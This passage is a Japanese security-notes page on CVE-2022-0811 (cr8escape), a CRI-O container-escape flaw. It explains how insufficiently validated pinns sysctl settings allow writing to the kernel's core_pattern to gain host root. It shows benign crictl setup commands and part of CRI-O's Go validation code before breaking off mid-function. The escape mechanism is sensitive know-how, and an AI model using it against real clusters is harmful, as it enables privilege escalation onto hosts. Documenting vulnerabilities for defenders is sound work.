
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <title>CVE-2022-0811 · HonKit</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 3.7.1">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="spring4shell.html" />
    
    
    <link rel="prev" href="cve-2022-0492.html" />
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <span>
            
                    
                    Kubernetes
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../k8s/general.html">
            
                <a href="../k8s/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../k8s/ingress.html">
            
                <a href="../k8s/ingress.html">
            
                    
                    Ingress
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../k8s/external-secrets.html">
            
                <a href="../k8s/external-secrets.html">
            
                    
                    External Secrets
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../k8s/secret-store-csi-driver.html">
            
                <a href="../k8s/secret-store-csi-driver.html">
            
                    
                    Secret Store CSI Driver
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../k8s/krew.html">
            
                <a href="../k8s/krew.html">
            
                    
                    Krew
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../k8s/policy.html">
            
                <a href="../k8s/policy.html">
            
                    
                    Policy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../k8s/security.html">
            
                <a href="../k8s/security.html">
            
                    
                    Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../k8s/helm.html">
            
                <a href="../k8s/helm.html">
            
                    
                    Helm
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../k8s/tips.html">
            
                <a href="../k8s/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../k8s/references.html">
            
                <a href="../k8s/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <span>
            
                    
                    Apps
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../apps/mattermost.html">
            
                <a href="../apps/mattermost.html">
            
                    
                    Mattermost
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    Prometheus
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../prometheus/general.html">
            
                <a href="../prometheus/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../prometheus/references.html">
            
                <a href="../prometheus/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" >
            
                <span>
            
                    
                    Linux
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../linux/general.html">
            
                <a href="../linux/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../linux/kernel.html">
            
                <a href="../linux/kernel.html">
            
                    
                    Kernel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../linux/grep.html">
            
                <a href="../linux/grep.html">
            
                    
                    grep
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="../linux/awk.html">
            
                <a href="../linux/awk.html">
            
                    
                    awk
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="../linux/crontab.html">
            
                <a href="../linux/crontab.html">
            
                    
                    crontab
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="../linux/curl.html">
            
                <a href="../linux/curl.html">
            
                    
                    curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="../linux/zsh.html">
            
                <a href="../linux/zsh.html">
            
                    
                    zsh
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="../linux/ebpf.html">
            
                <a href="../linux/ebpf.html">
            
                    
                    eBPF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.9" data-path="../linux/tips.html">
            
                <a href="../linux/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.10" data-path="../linux/references.html">
            
                <a href="../linux/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" >
            
                <span>
            
                    
                    macOS
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../macos/kernel.html">
            
                <a href="../macos/kernel.html">
            
                    
                    Kernel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="../macos/sext.html">
            
                <a href="../macos/sext.html">
            
                    
                    System Extensions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="../macos/tips.html">
            
                <a href="../macos/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.4" data-path="../macos/references.html">
            
                <a href="../macos/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" >
            
                <span>
            
                    
                    Git
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="../git/general.html">
            
                <a href="../git/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="../git/actions.html">
            
                <a href="../git/actions.html">
            
                    
                    GitHub Actions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="../git/tips.html">
            
                <a href="../git/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="../git/references.html">
            
                <a href="../git/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" >
            
                <span>
            
                    
                    Golang
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../golang/general.html">
            
                <a href="../golang/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../golang/modules.html">
            
                <a href="../golang/modules.html">
            
                    
                    Modules
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../golang/wasm.html">
            
                <a href="../golang/wasm.html">
            
                    
                    WASM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.4" data-path="../golang/goland.html">
            
                <a href="../golang/goland.html">
            
                    
                    Goland
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.5" data-path="../golang/tools.html">
            
                <a href="../golang/tools.html">
            
                    
                    Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.6" data-path="../golang/references.html">
            
                <a href="../golang/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" >
            
                <span>
            
                    
                    Terraform
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.9.1" data-path="../terraform/general.html">
            
                <a href="../terraform/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.2" data-path="../terraform/functions.html">
            
                <a href="../terraform/functions.html">
            
                    
                    Functions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.3" data-path="../terraform/sops.html">
            
                <a href="../terraform/sops.html">
            
                    
                    sops terraform provider
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.4" data-path="../terraform/plan-sensitive.html">
            
                <a href="../terraform/plan-sensitive.html">
            
                    
                    terraform plan で sensitive values を参照する
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.5" data-path="../terraform/tips.html">
            
                <a href="../terraform/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.6" data-path="../terraform/references.html">
            
                <a href="../terraform/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.10" >
            
                <span>
            
                    
                    SRE
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.10.1" data-path="../sre/references.html">
            
                <a href="../sre/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.11" >
            
                <span>
            
                    
                    GCP
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.11.1" data-path="../gcp/general.html">
            
                <a href="../gcp/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.2" data-path="../gcp/command.html">
            
                <a href="../gcp/command.html">
            
                    
                    Commands
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.3" data-path="../gcp/lb.html">
            
                <a href="../gcp/lb.html">
            
                    
                    Load Balancer
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.4" data-path="../gcp/cert.html">
            
                <a href="../gcp/cert.html">
            
                    
                    TLS for Internal Ingress
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.5" data-path="../gcp/cloudrun.html">
            
                <a href="../gcp/cloudrun.html">
            
                    
                    Cloud Run
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.6" data-path="../gcp/bigquery.html">
            
                <a href="../gcp/bigquery.html">
            
                    
                    BigQuery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.7" data-path="../gcp/logging.html">
            
                <a href="../gcp/logging.html">
            
                    
                    Logging
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.8" data-path="../gcp/security_logging.html">
            
                <a href="../gcp/security_logging.html">
            
                    
                    Security Logging
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.9" data-path="../gcp/oidc.html">
            
                <a href="../gcp/oidc.html">
            
                    
                    OIDC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.10" data-path="../gcp/references.html">
            
                <a href="../gcp/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.12" >
            
                <span>
            
                    
                    AWS
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.12.1" data-path="../aws/general.html">
            
                <a href="../aws/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.2" data-path="../aws/command.html">
            
                <a href="../aws/command.html">
            
                    
                    Commands
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.3" data-path="../aws/iam.html">
            
                <a href="../aws/iam.html">
            
                    
                    IAM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.4" data-path="../aws/switch-role.html">
            
                <a href="../aws/switch-role.html">
            
                    
                    Switch Role
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.5" data-path="../aws/inspector.html">
            
                <a href="../aws/inspector.html">
            
                    
                    Amazon Inspector
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.6" data-path="../aws/references.html">
            
                <a href="../aws/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.13" >
            
                <span>
            
                    
                    Network
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.13.1" data-path="../network/dns.html">
            
                <a href="../network/dns.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.13.2" data-path="../network/tips.html">
            
                <a href="../network/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.13.3" data-path="../network/tools.html">
            
                <a href="../network/tools.html">
            
                    
                    Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.13.4" data-path="../network/references.html">
            
                <a href="../network/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.14" >
            
                <span>
            
                    
                    Web
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.14.1" data-path="../web/chrome.html">
            
                <a href="../web/chrome.html">
            
                    
                    Google Chrome
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.2" data-path="../web/http.html">
            
                <a href="../web/http.html">
            
                    
                    HTTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.3" data-path="../web/tls.html">
            
                <a href="../web/tls.html">
            
                    
                    TLS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.4" data-path="../web/js.html">
            
                <a href="../web/js.html">
            
                    
                    JavaScript
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.5" data-path="../web/css.html">
            
                <a href="../web/css.html">
            
                    
                    CSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.6" data-path="../web/icon.html">
            
                <a href="../web/icon.html">
            
                    
                    Icon
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.7" data-path="../web/npm.html">
            
                <a href="../web/npm.html">
            
                    
                    NPM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.8" data-path="../web/react.html">
            
                <a href="../web/react.html">
            
                    
                    React
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14.9" data-path="../web/tools.html">
            
                <a href="../web/tools.html">
            
                    
                    Tools
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.15" >
            
                <span>
            
                    
                    SaaS
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.15.1" data-path="../saas/pagerduty.html">
            
                <a href="../saas/pagerduty.html">
            
                    
                    PagerDuty
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.16" >
            
                <span>
            
                    
                    Security
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.16.1" data-path="../security/general.html">
            
                <a href="../security/general.html">
            
                    
                    General
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.2" data-path="../security/books.html">
            
                <a href="../security/books.html">
            
                    
                    Books
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.3" data-path="../security/sns.html">
            
                <a href="../security/sns.html">
            
                    
                    SNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.4" data-path="../security/cve.html">
            
                <a href="../security/cve.html">
            
                    
                    CVE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.5" data-path="../security/cvss.html">
            
                <a href="../security/cvss.html">
            
                    
                    CVSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.6" data-path="../security/vuln.html">
            
                <a href="../security/vuln.html">
            
                    
                    Vulnerability
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.7" data-path="../security/malware.html">
            
                <a href="../security/malware.html">
            
                    
                    Malware
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.8" data-path="../security/ransomware.html">
            
                <a href="../security/ransomware.html">
            
                    
                    Ransomware
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.9" data-path="../security/pentest.html">
            
                <a href="../security/pentest.html">
            
                    
                    ペンテスト
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.10" data-path="../security/exploit.html">
            
                <a href="../security/exploit.html">
            
                    
                    Exploit
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.11" data-path="../security/learning.html">
            
                <a href="../security/learning.html">
            
                    
                    Learning
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.12" data-path="../security/incident.html">
            
                <a href="../security/incident.html">
            
                    
                    Incident
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.13" data-path="../security/ctf.html">
            
                <a href="../security/ctf.html">
            
                    
                    CTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.14" data-path="../security/forensics.html">
            
                <a href="../security/forensics.html">
            
                    
                    Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.15" data-path="../security/container.html">
            
                <a href="../security/container.html">
            
                    
                    Container Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.16" data-path="../security/phishing.html">
            
                <a href="../security/phishing.html">
            
                    
                    Phishing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.17" data-path="../security/cti.html">
            
                <a href="../security/cti.html">
            
                    
                    CTI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.18" data-path="../security/osint.html">
            
                <a href="../security/osint.html">
            
                    
                    OSINT
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.19" data-path="../security/csirt.html">
            
                <a href="../security/csirt.html">
            
                    
                    CSIRT
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.20" data-path="../security/ir.html">
            
                <a href="../security/ir.html">
            
                    
                    Incident Response
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.21" data-path="../security/mitre.html">
            
                <a href="../security/mitre.html">
            
                    
                    MITRE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.22" data-path="../security/killchain.html">
            
                <a href="../security/killchain.html">
            
                    
                    Kill Chain
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.23" data-path="../security/reports.html">
            
                <a href="../security/reports.html">
            
                    
                    Reports
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.24" data-path="../security/tools.html">
            
                <a href="../security/tools.html">
            
                    
                    Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.25" data-path="../security/cloud.html">
            
                <a href="../security/cloud.html">
            
                    
                    Cloud Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.26" data-path="../security/aws.html">
            
                <a href="../security/aws.html">
            
                    
                    AWS Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.27" data-path="../security/waf.html">
            
                <a href="../security/waf.html">
            
                    
                    WAF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.28" data-path="../security/web.html">
            
                <a href="../security/web.html">
            
                    
                    Web
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.29" data-path="../security/vendor.html">
            
                <a href="../security/vendor.html">
            
                    
                    Security Vendors
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.30" data-path="../security/edr.html">
            
                <a href="../security/edr.html">
            
                    
                    EDR
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.31" data-path="../security/mac.html">
            
                <a href="../security/mac.html">
            
                    
                    macOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.32" data-path="../security/darkweb.html">
            
                <a href="../security/darkweb.html">
            
                    
                    Dark Web
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.33" data-path="../security/ipa-sc.html">
            
                <a href="../security/ipa-sc.html">
            
                    
                    情報処理安全確保支援士
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.34" data-path="../security/ceh.html">
            
                <a href="../security/ceh.html">
            
                    
                    CEH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.35" data-path="../security/terms.html">
            
                <a href="../security/terms.html">
            
                    
                    用語集
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.36" data-path="../security/references.html">
            
                <a href="../security/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.17" >
            
                <span>
            
                    
                    Security Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.17.1" data-path="../sectools/vuls.html">
            
                <a href="../sectools/vuls.html">
            
                    
                    Vuls
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.17.2" data-path="../sectools/burp.html">
            
                <a href="../sectools/burp.html">
            
                    
                    Burp Suite
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.18" >
            
                <span>
            
                    
                    Security Reports
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.18.1" data-path="log4shell.html">
            
                <a href="log4shell.html">
            
                    
                    log4shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.18.2" data-path="dirtypipe.html">
            
                <a href="dirtypipe.html">
            
                    
                    Dirty Pipe
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.18.3" data-path="cve-2022-0492.html">
            
                <a href="cve-2022-0492.html">
            
                    
                    CVE-2022-0492
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.18.4" data-path="cve-2022-0811.html">
            
                <a href="cve-2022-0811.html">
            
                    
                    CVE-2022-0811
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.18.5" data-path="spring4shell.html">
            
                <a href="spring4shell.html">
            
                    
                    Srping4shell
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.19" >
            
                <span>
            
                    
                    Programming
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.19.1" data-path="../programming/contests.html">
            
                <a href="../programming/contests.html">
            
                    
                    コンテスト
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.19.2" data-path="../programming/references.html">
            
                <a href="../programming/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.20" >
            
                <span>
            
                    
                    Computer Science
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.20.1" data-path="../cs/references.html">
            
                <a href="../cs/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.21" >
            
                <span>
            
                    
                    SQL
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.21.1" data-path="../sql/references.html">
            
                <a href="../sql/references.html">
            
                    
                    References
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.22" >
            
                <span>
            
                    
                    VSCode
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.22.1" data-path="../vscode/tips.html">
            
                <a href="../vscode/tips.html">
            
                    
                    Tips
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            Published with HonKit
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >CVE-2022-0811</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="cve-2022-0811">CVE-2022-0811</h1>
<h2 id="cve-2022-0811-概要">CVE-2022-0811 概要</h2>
<ul>
<li>CRI-O の任意コード実行、コンテナブレイクアウトの脆弱性</li>
<li>cr8escape と CrowdStrike 社は呼んでいる</li>
<li>v1.19 以降に影響</li>
<li>pinns のカーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能</li>
<li>プロセスを異常終了させることでホストの root 権限で任意の操作を行える</li>
<li>LSM では防げないが、OPA 等のポリシーで回避可能</li>
</ul>
<h2 id="cri-o-について">CRI-O について</h2>
<h3 id="cri-o-概要">CRI-O 概要</h3>
<p>CRI-O は Kubernetes に特化した軽量な高レベルコンテナランタイム<br>docker や containerd とは異なり、コンテナ作成にはまず pod を作成し、その中にコンテナを作成する必要がある<br>CLI ツールは crictl (<a href="https://github.com/kubernetes-sigs/cri-tools" target="_blank">https://github.com/kubernetes-sigs/cri-tools</a>)</p>
<pre><code># cat container-config.json 
{
  &quot;metadata&quot;: {
      &quot;name&quot;: &quot;ubuntu&quot;
  },
  &quot;image&quot;:{
      &quot;image&quot;: &quot;ubuntu&quot;
  },
  &quot;command&quot;: [
      &quot;sleep&quot;,
      &quot;3600&quot;
  ],
  &quot;log_path&quot;:&quot;ubuntu.0.log&quot;,
  &quot;linux&quot;: {
  }
}
# cat pod-config.json 
{
    &quot;metadata&quot;: {
        &quot;name&quot;: &quot;ubuntu-sandbox&quot;,
        &quot;namespace&quot;: &quot;default&quot;,
        &quot;attempt&quot;: 1,
        &quot;uid&quot;: &quot;hdishd83djaidwnduwk28bcsb&quot;
    },
    &quot;log_directory&quot;: &quot;/tmp&quot;,
    &quot;linux&quot;: {
    }
}
# crictl runp pod-config.json 
b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc
# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json 
2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7
# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7
2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7
# crictl pods
POD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIME
b69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)
# crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID
2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6
</code></pre><h3 id="pinns-による-pod-へのカーネルパラメータ設定">pinns による pod へのカーネルパラメータ設定</h3>
<p>CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータを設定できる<br>sysctls への対応は v1.19 で追加 (<a href="https://github.com/cri-o/cri-o/commit/26de5b665937608100817bc3b21f3eca41014dd2" target="_blank">first commit</a>)</p>
<p>設定には <code>-s</code> オプションを使用。key=value の形式で、複数のカーネルパラメータを <code>+</code> で連結して指定する</p>
<pre><code class="lang-bash">pinns -s kernel_parameter1=value1+kernel_parameter2=value2
</code></pre>
<p>設定可能なパラメータは以下で制限されている</p>
<p><a href="https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.go" target="_blank">https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.go</a></p>
<pre><code class="lang-go"><span class="hljs-keyword">var</span> prefixNamespaces = <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]Namespace{
  <span class="hljs-string">&quot;kernel.shm&quot;</span>: IpcNamespace,
  <span class="hljs-string">&quot;kernel.msg&quot;</span>: IpcNamespace,
  <span class="hljs-string">&quot;fs.mqueue.&quot;</span>: IpcNamespace,
  <span class="hljs-string">&quot;net.&quot;</span>:       NetNamespace,
}

<span class="hljs-comment">// Validate checks that a sysctl is whitelisted because it is known to be</span>
<span class="hljs-comment">// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used</span>
<span class="hljs-comment">// to forbid sysctls for pod sharing the respective namespaces with the host.</span>
<span class="hljs-comment">// This check is only used on sysctls defined by the user in the crio.conf</span>
<span class="hljs-comment">// file.</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Sysctl)</span> <span class="hljs-title">Validate</span><span class="hljs-params">(hostNet, hostIPC <span class="hljs-keyword">bool</span>)</span> <span class="hljs-title">error</span></span> {
  nsErrorFmt := <span class="hljs-string">&quot;%q not allowed with host %s enabled&quot;</span>
  <span class="hljs-keyword">if</span> ns, found := namespaces[s.Key()]; found {
    <span class="hljs-keyword">if</span> ns == IpcNamespace &amp;&amp; hostIPC {
      <span class="hljs-keyword">return</span> errors.Errorf(nsErrorFmt, s.Key(), ns)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
  }
  <span class="hljs-keyword">for</span> p, ns := <span class="hljs-keyword">range</span> prefixNamespaces {
    <span class="hljs-keyword">if</span> strings.HasPrefix(s.Key(), p) {
